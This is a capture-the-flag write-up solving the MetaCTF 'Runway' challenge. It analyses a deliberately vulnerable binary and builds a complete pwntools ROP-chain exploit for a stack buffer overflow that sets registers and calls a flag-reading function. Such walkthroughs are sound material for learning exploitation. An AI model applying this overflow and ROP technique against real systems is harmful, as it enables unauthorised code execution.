# MetaCTF - Runway

Category: PWN

Difficulty: Easy

## Source

```bash
> ls
flag.txt  runway
> cat flag.txt
METACTF{TEST_FLAG}
> file runway
runway: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cebb0e07ef2ab15e011fbd3808e8e9c7e8c597de, for GNU/Linux 3.2.0, not stripped
```

[source](https://drive.google.com/file/d/10m5K1-J_yc1u6RQJGdSERKnAORDjRM5b/view)

## Analysis

The source files provided a binary and a flag.txt. This indicates the server is running with the real flag.txt in the same directory so we can assume that the challenge involves finding the real flag by reaching it.

Running checksec returns:

```bash
> checksec --file=runway
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   49 Symbols	  No	0		3		runway
```

Not many protections, this means a buffer overflow is most likely possible.

Running the file:

```bash
> ./runway 

=== WELCOME TO METACTF INTERNATIONAL AIRPORT ===
Your flight: CTF-007
Destination: Flag Retrieval
Objective: Adjust approach parameters to gain landing clearance

Airport Approach Control System
Runway buffer [64 bytes] ready for approach vectors
Enter approach parameters one byte at a time:
Vector byte:
```
```bash
Enter approach parameters one byte at a time:
Vector byte: abc

<<< LANDING ABORTED >>> Return to holding pattern
```

Just prints some stuff and expects an input, then prints "LANDING ABORTED" for an unsatisfactory input. Let’s open the file on ghidra

```c
undefined8 main(void)
{
  setup();
  puts("\n=== WELCOME TO METACTF INTERNATIONAL AIRPORT ===");
  puts("Your flight: CTF-007");
  puts("Destination: Flag Retrieval");
  puts("Objective: Adjust approach parameters to gain landing clearance\n");
  approach_control();
  puts("\n<<< LANDING ABORTED >>> Return to holding pattern");
  return 0;
}


void approach_control(void)
{
  undefined local_98 [136];
  undefined *local_10;
  
  local_10 = local_98;
  puts("Airport Approach Control System");
  puts("Runway buffer [64 bytes] ready for approach vectors");
  puts("Enter approach parameters one byte at a time:");
  printf("Vector byte: ");
  fflush(stdout);
  read(0,local_10,0x100);
  return;
}
```

The intended behavior of the binary is to take an input and immediately  print “LANDING ABORTED”. The decompilation does show an interesting  function though: 

```c
void clear_to_land(long param_1,long param_2,long param_3,long param_4,long param_5,char *param_6)
{
  char *pcVar1;
  char local_78 [104];
  FILE *local_10;
  
  if ((((param_1 == 1) && (param_2 == 2)) && (param_3 == 3)) && ((param_4 == 4 && (param_5 == 5))))
  {
    puts("\n\x1b[32m=== CLEARED TO LAND ===");
    local_10 = fopen(param_6,"r");
    if (local_10 == (FILE *)0x0) {
      puts("Error: Could not open flag file");
      FUN_00401140(1);
    }
    pcVar1 = fgets(local_78,100,local_10);
    if (pcVar1 == (char *)0x0) {
      puts("Error: Could not read flag");
      fclose(local_10);
      FUN_00401140(1);
    }
    printf("Flag: %s\n",local_78);
    fclose(local_10);
  }
  else {
    puts("\n\x1b[31m<<< INCORRECT APPROACH PARAMETERS! ABORTING! >>>\x1b[0m");
    FUN_00401140(1);
  }
  return;
}
```

Looks like we found our “win” function. Now the goal is to redirect the binary to run this function with the correct parameters, but how do we get the correct parameters?

Looking at a bit of the disassembly of clear_to_land will clear this up a little bit:

```asm
   0x0000000000401245 <+15>:	mov    QWORD PTR [rbp-0x78],rdi
   0x0000000000401249 <+19>:	mov    QWORD PTR [rbp-0x80],rsi
   0x000000000040124d <+23>:	mov    QWORD PTR [rbp-0x88],rdx
   0x0000000000401254 <+30>:	mov    QWORD PTR [rbp-0x90],rcx
   0x000000000040125b <+37>:	mov    QWORD PTR [rbp-0x98],r8
   0x0000000000401262 <+44>:	mov    QWORD PTR [rbp-0xa0],r9
   0x0000000000401269 <+51>:	cmp    QWORD PTR [rbp-0x78],0x1
   0x000000000040126e <+56>:	jne    0x40135d <clear_to_land+295>
   0x0000000000401274 <+62>:	cmp    QWORD PTR [rbp-0x80],0x2
   0x0000000000401279 <+67>:	jne    0x40135d <clear_to_land+295>
   0x000000000040127f <+73>:	cmp    QWORD PTR [rbp-0x88],0x3
   0x0000000000401287 <+81>:	jne    0x40135d <clear_to_land+295>
   0x000000000040128d <+87>:	cmp    QWORD PTR [rbp-0x90],0x4
   0x0000000000401295 <+95>:	jne    0x40135d <clear_to_land+295>
   0x000000000040129b <+101>:	cmp    QWORD PTR [rbp-0x98],0x5
   0x00000000004012a3 <+109>:	jne    0x40135d <clear_to_land+295>
   0x00000000004012a9 <+115>:	lea    rax,[rip+0xd61]        # 0x402011
   0x00000000004012b0 <+122>:	mov    rdi,rax
   0x00000000004012b3 <+125>:	call   0x4010c0 <puts@plt>
   0x00000000004012b8 <+130>:	mov    rax,QWORD PTR [rbp-0xa0]
   0x00000000004012bf <+137>:	lea    rdx,[rip+0xd69]        # 0x40202f
   0x00000000004012c6 <+144>:	mov    rsi,rdx
   0x00000000004012c9 <+147>:	mov    rdi,rax
   0x00000000004012cc <+150>:	call   0x401130 <fopen@plt>
```

The disassembler compares 1 with [rbp-0x78] in line <+51>. [rbp - 0x78] is the value in rdi as shown by line <+15>, so param_1 is rdi. Similarly, the registers that represent param_2 - param_5 can be found:

```
param_1 = rdi
param_2 = rsi
param_3 = rdx
param_4 = rcx
param_5 = r8
```

According to the decompilation, param_6 represents the name of the file we want to open. To find the register it represents, we just need to view the lines before <+150> and see how the registers are organized before “fopen” is called. According to the [linux system call table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/), rdi represents the address of the name of the file we want to open.

<img width="707" height="221" alt="image" src="https://github.com/user-attachments/assets/94b33d34-bafc-4f1f-ae70-50508dd697c0" />

rdi has the value of rax in <+147>, rax has the value of [rbp-0xa0] in <+130> and [rbp-0xa0] has the value of r9.

```
param_6 = r9
```

## Solution

In order to find the flag, we need to overwrite param_1 - param_5 to be 1, 2, 3, 4, 5 respectively, find a way to get r9 to point to the string “flag.txt”.

Since we are looking to overwrite specific registers, we should look for gadgets in the binary that we can execute while it’s running.

```bash
ropper -f runway | grep "pop"
```

Output:

```asm
0x00000000004013b5: pop r8; ret; 
0x00000000004013c3: pop r9; ret; 
0x00000000004013b6: pop rax; ret; 
0x000000000040121d: pop rbp; ret; 
0x00000000004013a8: pop rcx; ret; 
0x0000000000401381: pop rdi; ret; 
0x000000000040139b: pop rdx; ret; 
0x000000000040138e: pop rsi; ret;
```

One way to redirect the binary towards running these snippets of code is to overflow the return pointer to match of these addresses. When the binary runs one of these lines for instance “pop rdi”, we can put a value directly afterwards to insert into rdi. After all parameters are ready, we can place the address of the win function and get the flag.

### solve.py

```py
from pwn import *

win = p64(0x0000000000401236) #found on ghidra
pop_param1 = p64(0x0000000000401381)
pop_param2 = p64(0x000000000040138e)
pop_param3 = p64(0x000000000040139b)
pop_param4 = p64(0x00000000004013a8)
pop_param5 = p64(0x00000000004013b5)
pop_param6 = p64(0x00000000004013c3)
```

There are a few ways to find how large the buffer is before I can start putting addresses into the input. One thing I like to do is crash the program on purpose with a super large input and check the return pointer to see what part of that input I should replace with my target address:

```bash
#gdb
pwndbg> cyclic 500
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa
pwndbg> r
Starting program: /home/hamzat/Stuff/ctf/pwn/meta3,/runway 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

=== WELCOME TO METACTF INTERNATIONAL AIRPORT ===
Your flight: CTF-007
Destination: Flag Retrieval
Objective: Adjust approach parameters to gain landing clearance

Airport Approach Control System
Runway buffer [64 bytes] ready for approach vectors
Enter approach parameters one byte at a time:
Vector byte: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401450 in approach_control ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────
 RAX  0x100
 RBX  0
 RCX  0x7ffff7e24728 (fflush+72) ◂— neg eax
 RDX  0x100
 RDI  0
 RSI  0x7fffffffe320 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0
 R9   0
 R10  0
 R11  0x202
 R12  0x7fffffffe4e8 —▸ 0x7fffffffe844 ◂— '/home/hamzat/Stuff/ctf/pwn/meta3,/runway'
 R13  1
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
 R15  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401200 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x6161616161616173 ('saaaaaaa')
 RSP  0x7fffffffe3b8 ◂— 0x6161616161616174 ('taaaaaaa')
 RIP  0x401450 (approach_control+135) ◂— ret 
─────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
 ► 0x401450 <approach_control+135>    ret                                <0x6161616161616174>
```

pwndbg is pretty generous with the information it can give you about a crashed binary. The bit that concerns us the final value of the return pointer (’taaaaaaa’). The program crashed because ‘taaaaaaa’ is not a valid address it can direct itself to so we should replace that part of my input with an address I would like the program to land on.

As previously stated, if the program executes “pop rdi”, rdi takes the first value it sees on the stack. We can overwrite all of our registers knowing this information

### solve.py

```py
from pwn import *

pl = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaaaaaaaaaa'

win = p64(0x0000000000401236)
pop_param1 = p64(0x0000000000401381)
pop_param2 = p64(0x000000000040138e)
pop_param3 = p64(0x000000000040139b)
pop_param4 = p64(0x00000000004013a8)
pop_param5 = p64(0x00000000004013b5)
pop_param6 = p64(0x00000000004013c3)

pl += pop_param1 + p64(0x1)
pl += pop_param2 + p64(0x2)
pl += pop_param3 + p64(0x3)
pl += pop_param4 + p64(0x4)
pl += pop_param5 + p64(0x5)
pl += pop_param6 + p64(0x00402008) # "flag.txt" was luckily found hardcoded in the binary so its address should be placed here
pl += win # return to the clear_to_land function to read the flag
```

Now to connect to the binary and test out the payload:

```py
from pwn import *

pl = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaaaaaaaaaa'

win = p64(0x0000000000401236)
pop_param1 = p64(0x0000000000401381)
pop_param2 = p64(0x000000000040138e)
pop_param3 = p64(0x000000000040139b)
pop_param4 = p64(0x00000000004013a8)
pop_param5 = p64(0x00000000004013b5)
pop_param6 = p64(0x00000000004013c3)

pl += pop_param1 + p64(0x1)
pl += pop_param2 + p64(0x2)
pl += pop_param3 + p64(0x3)
pl += pop_param4 + p64(0x4)
pl += pop_param5 + p64(0x5)
pl += pop_param6 + p64(0x00402008)
pl += win


io = process('./runway')

io.recvall()

io.sendline(pl)

io.interactive()
```

```bash
> python3 solve.py                                                                                                                                1 ✘  1m 4s  
[+] Starting local process './runway': pid 6293
[*] Switching to interactive mode

=== CLEARED TO LAND ===
Flag: METACTF{TEST_FLAG}
```

Worked fine locally, connect to the server using io = remote(’server.name’, port) and run the same script to get the real flag.
